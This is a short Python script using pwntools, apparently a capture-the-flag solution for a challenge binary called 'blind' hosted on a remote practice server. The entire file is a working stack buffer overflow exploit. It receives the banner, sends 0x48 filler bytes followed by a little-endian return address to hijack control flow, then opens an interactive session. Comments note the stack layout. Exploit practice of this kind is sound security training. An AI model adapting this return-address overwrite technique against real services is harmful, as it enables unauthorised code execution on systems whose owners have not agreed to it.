from pwn import *
import re

# p = process("./blind")
p = remote("plsdonthaq.me", 2002)

# Address: 0x80484d6

data = p.recv()
print(data)

# ebp-0x44 
# | ebp-0x44 | ebp | ebp+4 |

p.sendline(b"D" * 0x48 + b"\xd6\x84\x04\x08")
# print(p.poll(block=True))

p.interactive()